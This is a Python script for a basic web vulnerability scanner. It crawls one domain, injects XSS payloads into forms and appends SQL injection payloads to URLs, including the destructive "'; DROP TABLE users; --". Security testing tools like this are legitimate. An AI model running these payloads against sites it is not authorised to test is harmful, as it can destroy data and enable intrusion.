import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

# Common payloads
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1--"]
xss_payloads = ['<script>alert("XSS")</script>', '" onmouseover="alert(1)"']

visited_links = set()

def is_valid_url(url):
    return url.startswith("http")

def get_all_forms(url):
    try:
        soup = BeautifulSoup(requests.get(url).content, "html.parser")
        return soup.find_all("form")
    except:
        return []

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        if name:
            inputs.append({"type": input_type, "name": name})

    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = value
        else:
            data[input["name"]] = "test"

    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)
    except:
        return None

def test_xss(form_details, url):
    for payload in xss_payloads:
        response = submit_form(form_details, url, payload)
        if response and payload in response.text:
            print(f"🛑 XSS vulnerability found at {url}")
            print(f"Payload: {payload}\n")

def test_sql_injection(url):
    for payload in sql_payloads:
        test_url = f"{url}?id={payload}"
        try:
            res = requests.get(test_url)
            if any(err in res.text.lower() for err in ["sql syntax", "mysql", "ora-", "syntax error"]):
                print(f"🛑 SQL Injection vulnerability found at {test_url}")
                print(f"Payload: {payload}\n")
        except:
            pass

def crawl_and_scan(url):
    if url in visited_links:
        return
    visited_links.add(url)

    print(f"🔍 Scanning: {url}")
    test_sql_injection(url)

    forms = get_all_forms(url)
    for form in forms:
        form_details = get_form_details(form)
        test_xss(form_details, url)

    # Crawl internal links
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")
        for link in soup.find_all("a", href=True):
            href = link['href']
            full_url = urljoin(url, href)
            if urlparse(full_url).netloc == urlparse(url).netloc:
                crawl_and_scan(full_url)
    except:
        pass

def main():
    print("=== Web Vulnerability Scanner ===")
    target = input("Enter target URL (e.g., http://localhost:8000): ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    crawl_and_scan(target)
    print("✅ Scan complete.")

if __name__ == "__main__":
    main()
